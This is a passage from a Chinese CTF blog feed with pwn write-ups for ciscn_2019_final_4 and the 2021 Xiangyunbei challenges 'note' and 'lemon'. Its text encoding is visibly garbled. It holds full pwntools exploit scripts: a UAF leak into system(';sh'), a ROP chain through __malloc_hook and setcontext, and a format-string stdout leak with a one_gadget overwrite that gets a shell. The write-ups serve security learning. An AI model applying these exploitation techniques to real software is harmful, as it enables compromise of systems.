class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="å››ã€ciscn-2019-final-4"><a href="#å››ã€ciscn-2019-final-4" class="headerlink" title="å››ã€ciscn_2019_final_4"></a>å››ã€ciscn_2019_final_4</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007190521092.png" alt="image-20211007190521092"></p><p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œæ²¡å¼€PIE</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191435082.png" alt="image-20211007191435082"></p><p>deleteå‡½æ•°é‡Œé¢å­˜åœ¨UAF</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191927917.png" alt="image-20211007191927917"></p><p>ç¦ç”¨äº†execveï¼Œæ‰€ä»¥å¾—è¦ropè¯»å–flag</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007192957739.png" alt="image-20211007192957739"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193057775.png" alt="image-20211007193057775"></p><p>ä¼¼ä¹æ— æ³•è°ƒè¯•è¿™é¢˜ï¼Œå»ç™¾åº¦äº†ä¸€ä¸‹<a href="https://blog.csdn.net/seaaseesa/article/details/105855306%EF%BC%8C%E5%8E%9F%E6%9D%A5%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E8%B0%83%E8%AF%95%E7%9A%84%E3%80%82%60ptrace%60">https://blog.csdn.net/seaaseesa/article/details/105855306ï¼ŒåŸæ¥å‰é¢çš„ä»£ç éƒ½æ˜¯ä¸ºäº†è®©æˆ‘ä»¬æ— æ³•è°ƒè¯•çš„ã€‚`ptrace`</a> æä¾›äº†ä¸€ç§æœºåˆ¶ä½¿å¾—çˆ¶è¿›ç¨‹å¯ä»¥è§‚å¯Ÿå’Œæ§åˆ¶å­è¿›ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹ã€‚çˆ¶è¿›ç¨‹ fork() å‡ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä¸­æ‰§è¡Œæˆ‘ä»¬æ‰€æƒ³è¦ trace çš„ç¨‹åºï¼Œåœ¨å­è¿›ç¨‹è°ƒç”¨ exec() ä¹‹å‰ï¼Œå­è¿›ç¨‹éœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡ ptraceï¼Œä»¥ PTRACE_TRACEME ä¸ºå‚æ•°ã€‚</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193646167.png" alt="image-20211007193646167"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193755639.png" alt="image-20211007193755639"></p><p>æ‰€ä»¥è°ƒè¯•çš„å­è¿›ç¨‹å·²ç»è¢«å ç”¨ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•å†ç”Ÿæˆä¸€ä¸ªï¼Œæ‰€ä»¥è¦è®©è¿™æ®µç¨‹åºå¤±æ•ˆï¼Œæ ¹æ®å¸ˆå‚…çš„åšæ³•æ˜¯ä¿®æ”¹æ±‡ç¼–ä»£ç ä¸º<code>jmp $+0x9E</code>ï¼Œç›´æ¥è·³è½¬åˆ°åé¢çš„å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé¿å…å ç”¨å­è¿›ç¨‹</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007194639451.png" alt="image-20211007194639451"></p><p>ç”¨keypatchè¿™æ ·æ”¹ä¸äº†ã€‚ã€‚ã€‚</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195234222.png" alt="image-20211007195234222"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195506179.png" alt="image-20211007195506179"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195609719.png" alt="image-20211007195609719"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195846918.png" alt="image-20211007195846918"></p><p>æ‰€ä»¥æ¨¡ä»¿å¸ˆå‚…çš„åšæ³•ï¼Œä¿®æ”¹æœºå™¨ç ï¼ŒæŠŠå¯¹åº”çš„æœºå™¨ç ä¿®æ”¹ä¸ºä¸Šè¿°çš„e999000000å³å¯ï¼Œç„¶åå°±èƒ½è°ƒè¯•äº†ã€‚</p><p>ç„¶åè¯´ä¸‹æ€è·¯ï¼Œå¤§æ–¹å‘æ˜¯orwè¯»å–flagï¼Œç½‘ä¸Šå¸ˆå‚…çš„wpæ˜¯åˆ©ç”¨å‰é¢ç»™çš„æ ˆåœ°å€è¿›è¡Œä¼ªé€ ä¸€ä¸ªå †å¤´ï¼Œè®©åç»­çš„å †å—å¯ä»¥åˆ†é…è¿‡å»æ§åˆ¶è¿”å›åœ°å€ï¼ˆå¹¶ä¸”æ ˆåœ°å€è¿˜å¾—å…ˆè¦æ³„éœ²å‡ºæ¥ï¼‰ï¼Œä½†æ˜¯å› ä¸ºç¨‹åºæ˜¯ä¸ªæ­»å¾ªç¯ï¼Œæ‰€ä»¥è¿˜è¦åŠ«æŒé‡Œé¢çš„å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®©ç¨‹åºçœŸæ­£çš„é€€å‡ºï¼Œæ‰èƒ½å»æ‰§è¡Œå¸ƒç½®çš„ropã€‚æˆ‘è§‰å¾—æœ‰ç‚¹éº»çƒ¦äº†ï¼Œä¸å¦‚ä½¿ç”¨åŠ«æŒmalloc_hookä¸ºsetcontext + 53ï¼Œä¸ç”¨åŠ«æŒè¿™ä¹ˆå¤šçš„ã€‚</p><p>å¥½å§ï¼Œæˆ‘æ˜¯æ²™æ¯”ï¼Œå¿˜äº†mallocçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„sizeï¼Œå…´å†²å†²è¦è¯»flagï¼Œçœ‹åˆ°gdbé‡Œé¢rdiå€¼æ˜¯0xd0ï¼Œäººå‚»äº†ï¼Œè¿™é¢˜æœ¬æ¥çš„åšæ³•å¤ªéº»çƒ¦äº†ï¼Œæˆ‘ä¸åšäº†ï¼Œæºœäº†æºœäº†</p><p>é‚£å°±æ€»ç»“ä¸€ä¸‹æ€è·¯å§ï¼Œé˜²æ­¢ä»¥åæ¯”èµ›é‡åˆ°äº†ï¼Œä¹Ÿèƒ½æœ‰å°è±¡é¡ºç€åšï¼Œæ…¢æ…¢è°ƒè¯•</p><ul><li><p>é¦–å…ˆï¼Œåè°ƒè¯•ï¼Œå¯ä»¥é€‰æ‹©ä¿®æ”¹idaé‡Œé¢çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œè®©åè°ƒè¯•çš„ç¨‹åºä¸è¢«æ‰§è¡Œåˆ°ï¼Œä»è€Œå¯ä»¥è°ƒè¯•ã€‚è€Œæœºå™¨æŒ‡ä»¤å¯ä»¥ç”¨pwntoolså¾—åˆ°</p></li><li><p>å…¶æ¬¡ï¼Œå¦‚æœå¯ä»¥è¾“å…¥æ ˆçš„å†…å®¹ï¼Œåœ¨é‡Œé¢å¸ƒç½®å †å¤´ï¼Œç”±æ­¤æ¨å¹¿ï¼Œåœ¨å¯ä»¥è¾“å…¥çš„åœ°æ–¹éƒ½å¯ä»¥å¸ƒç½®å‡ºå †å¤´ï¼Œè®©æˆ‘ä»¬å¯ä»¥é€šè¿‡sizeæ£€æŸ¥ï¼Œã€‚å½“ç„¶è¿™ä»…ä»…æ˜¯2.23çš„ç‰ˆæœ¬ï¼Œä¹‹åçš„ç‰ˆæœ¬éƒ½ä¸ç”¨æ£€æŸ¥sizeçš„ã€‚å½“ç„¶å¸ƒç½®å®Œå †å¤´å°±è¦è·å¾—å †å¤´å¯¹åº”çš„åœ°å€</p></li><li><p>ç„¶åï¼Œå°±æ˜¯environå­˜ç€ä¸€ä¸ªæ ˆåœ°å€ï¼ˆè™½ç„¶æˆ‘æœ¬æ¥å°±çŸ¥é“ï¼Œå½“åšæ˜¯å¤ä¹ å§ï¼‰ã€‚å¸ƒç½®ropæ—¶é•¿åº¦ä¸å¤Ÿå†™ï¼Œå¯ä»¥å…ˆæ‰§è¡Œreadå‡½æ•°ï¼ŒåŠ é•¿å¯å†™çš„é•¿åº¦</p></li><li><p>æœ€åï¼Œå¦‚æœç¨‹åºä¸é€€å‡ºï¼Œå¯ä»¥ä¿®æ”¹æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬è®©ç¨‹åºæ‰§è¡Œåˆ°è¿”å›åœ°å€ï¼Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„rop</p><p>overï¼</p></li></ul><p>ç•™ä¸‹ä¸ªé”™è¯¯è„šæœ¬ï¼Œè·‘è·¯ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000400B2F&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content?&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index ?\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index ?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;what is your name?&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;sc&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#3</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span> <br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br><br><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x90</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x110</span><br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000417</span> + libc_base <br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p64(heap_base + <span class="hljs-number">0x240</span>) + p64(ret)) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0xf8</span>,rop) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#add(3,)</span><br>add(<span class="hljs-number">0x60</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext))<br>free(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb0</span>))<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä¸€ã€pwnable-simple-login&quot;&gt;&lt;a href=&quot;#ä¸€ã€pwnable-simple-login&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€pwnable_simple_login&quot;&gt;&lt;/a&gt;ä¸€ã€pwnable_simple_log</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>2021ç¥¥äº‘æ¯PWN</title>
    <link href="http://example.com/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</id>
    <published>2021-09-03T08:02:55.000Z</published>
    <updated>2021-10-13T08:01:23.255Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹æ˜¯æˆ‘æ ¹æ®å¤§ä½¬çš„wpä¸€ç‚¹ç‚¹å¤ç°çš„ï¼Œæ¯”èµ›æ—¶ï¼Œå¤ªèœäº†ï¼Œéƒ½æ²¡åšå‡ºæ¥ã€‚ä¸‹é¢ä¸¤ä¸ªé“¾æ¥æ˜¯å¤§ä½¬çš„wp</p><p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p><p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png" alt="image-20210903160536437"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p>è¿›å…¥IDAçœ‹çœ‹ï¼Œç¨‹åºå¾ˆç®€å•ï¼Œå°±ä¸ç»†è¯´äº†ã€‚ä¸»è¦è¯´ä¸‹æ¼æ´ç‚¹</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png" alt="image-20210903160656584"></p><p>åœ¨ä¿®æ”¹åŠŸèƒ½å‡½æ•°é‡Œé¢ï¼Œå­˜åœ¨scanf(buf)ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç„¶åè¿™è¾¹çš„è¦å»è®¡ç®—åç§»ï¼Œä¸€å®šè¦å»ç›¸åº”ç‰ˆæœ¬çš„Ubuntuä¸‹å»åŠ¨æ€è°ƒè¯•ï¼Œæˆ‘åˆšå¼€å§‹æ˜¯åœ¨20.04ä¸‹è°ƒè¯•ï¼Œåç§»ä¸å¯¹ã€‚ç„¶åè¿™è¾¹è°ƒè¯•æŠ€å·§ï¼šå› ä¸ºç¨‹åºå¼€pieäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆè¾“å…¥startæŒ‡ä»¤ï¼Œä¼šæ–­åœ¨å¼€å¤´ï¼Œè¿™æ—¶å€™å¯ä»¥è·å–å½“å‰çš„pieï¼Œæ‰èƒ½æ–­ç‚¹åœ¨ç›¸åº”çš„ä½ç½®</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png" alt="image-20210903161041335"></p><p>å¯ä»¥è®¡ç®—å‡ºåç§»æ˜¯6ï¼Œå¹¶ä¸”åœ¨åº•ä¸‹å°±å­˜åœ¨ç€æ®‹ç•™çš„stdoutæŒ‡é’ˆï¼Œæ­¤æ—¶stdoutæŒ‡é’ˆçš„åç§»æ˜¯7ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªbufå°±æ˜¯<code>%7$s</code>é‚£ä¹ˆå¯ä»¥ä¿®æ”¹stdoutä»è€Œæ³„éœ²libcåœ°å€</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png" alt="image-20210903162610572"></p><p>åå‡ºäº†ä¸€å¤§å †æ•°æ®ï¼Œæ¥æ”¶å³å¯ã€‚</p><p>ç„¶åå»åŠ«æŒexit_hookä¸­çš„_dl_rtld_lock_recursiveä¸ºone_gadgetï¼Œå½“è°ƒç”¨exitå‡½æ•°æ—¶å¯å¾—åˆ°shell</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png" alt="image-20210903171325616"></p><p>è€Œè¦æ‰¾åˆ°è¿™ä¸ªåç§»ï¼Œè¦å»_rtld_globalä¸­å¯»æ‰¾</p><p>è®¡ç®—å¯å¾—åç§»ä¸º0x5F0F48</p><p>è¿™è¾¹æˆ‘æ˜¯åœ¨æœ¬åœ°è°ƒè¯•çš„ï¼Œæˆ‘æ”¶åˆ°çš„libcçš„è·ç¦»libcåŸºå€çš„åç§»ä¸wpçš„ä¸å¤ªä¸€æ ·ï¼Œæ˜¯ä¸º479552ï¼Œç„¶åå°±æ˜¯å†æ¬¡å€Ÿç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‰é¢è¯´è¿‡äº†ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åœ¨ç¬¬å…­ä¸ªåç§»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«æ»¡å…«ä¸ªå­—èŠ‚ï¼Œç„¶åæŠŠè·å¾—çš„rtld_lockåœ°å€è·Ÿåœ¨åé¢å¡«å…¥ï¼Œå°±å˜ä¸ºç¬¬ä¸ƒä¸ªåç§»ï¼Œä¹‹åå°±èƒ½åœ¨ä¸Šé¢å†™å…¥one_gadgetï¼Œæœ€åæ‰§è¡Œexit(0)getshell</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png" alt="image-20210903174509942"></p><p>æˆåŠŸgetshell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png" alt="image-20210907101349756"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908150639102.png" alt="image-20210908150639102"></p><p>è¿›å…¥IDAï¼Œå‘ç°æ¼æ´åœ¨ä¿®æ”¹å †å—å†…å®¹çš„åŠŸèƒ½é‡Œï¼Œå› ä¸ºbuf[4]çš„å¤§å°æ˜¯æˆ‘ä»¬è®¾ç½®çš„ï¼Œæœ€å¤§å¯ä¸º0x400ï¼Œæ‰€ä»¥èƒ½äº§ç”Ÿå †æº¢å‡ºï¼ˆè¿™æ˜¯æˆ‘çœ‹å‡ºçš„æ¼æ´åˆ©ç”¨æ–¹æ³•ï¼‰ã€‚ä½†æ˜¯è¿™è¾¹å¤ç°çš„æ˜¯å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œåé¢å†æ</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907172951372.png" alt="image-20210907172951372"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907173047903.png" alt="image-20210907173047903"></p><p>è¿™é‡Œæœ‰ä¸ªä¼ªéšæœºæ•°ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹111111ï¼Œå¯ä»¥ç»•è¿‡</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908145856031.png" alt="image-20210908145856031"></p><p>flagè¢«ä¿å­˜åœ¨æ ˆä¸Šï¼ŒåŒæ—¶æœ‰ä¸ªæ ˆåœ°å€è¢«ä¿å­˜åœ¨.bssä¸Š</p><p><img 